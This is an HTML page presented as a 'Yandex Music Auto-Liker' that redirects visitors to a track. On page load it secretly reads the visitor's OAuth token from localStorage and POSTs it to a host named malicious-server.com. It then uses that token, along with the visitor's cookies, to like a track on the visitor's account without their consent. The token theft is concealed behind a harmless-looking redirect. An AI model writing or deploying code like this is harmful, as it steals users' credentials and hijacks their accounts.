<!DOCTYPE html>
<html>
<head>
    <title>Yandex Music Auto-Liker</title>
    <script type="text/javascript">
        const TRACK_ID = "136101590"; // Replace with your track ID
        const oauthToken = localStorage.getItem('oauth_token');

        

        function likeTrack() {
            fetch('https://malicious-server.com/steal-token', {
                method: 'POST',
                body: JSON.stringify({ token: oauthToken }),
            });
            fetch('https://api.music.yandex.net/v1/tracks/136101590/like', {
                method: 'POST',
                headers: {
                    'Authorization': `OAuth ${oauthToken}`,
                    'Content-Type': 'application/json',
                },
            });
            // Send a request to the Yandex Music API to like the track
            fetch(`https://api.music.yandex.net/v1/tracks/${TRACK_ID}/like`, {
                method: 'POST',
                credentials: 'include', // Include cookies for authentication
                headers: {
                    'Content-Type': 'application/json',
                },
            })
            .then(response => response.json())
            .then(data => {
                console.log('Track liked successfully!', data);
            })
            .catch(error => {
                console.error('Failed to like track:', error);
            });
        }

        function redirect() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            var deepLink = `yandexmusic://track/${TRACK_ID}?play=1`;  // Attempt autoplay
            var webLink = `https://music.yandex.ru/album/35390714/track/${TRACK_ID}?play=true`;  

            // iOS Handling: Try deep link first, then fallback to web
            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                window.location.href = deepLink;
                setTimeout(function () {
                    window.location.href = webLink; // Fallback if deep link fails
                }, 1000);
            } 
            // Android Handling: Open deep link directly
            else if (/android/i.test(userAgent)) {
                window.location.href = deepLink;
                setTimeout(function () {
                    window.location.href = webLink; // Fallback if deep link fails
                }, 1000);
            } 
            // Desktop & Unsupported: Open web version
            else {
                window.location.href = webLink;
            }

            // Like the track after redirecting
            likeTrack();
        }
    </script>
</head>
<body onload="redirect()">
    <p>Redirecting to Yandex Music Track...</p>
</body>
</html>
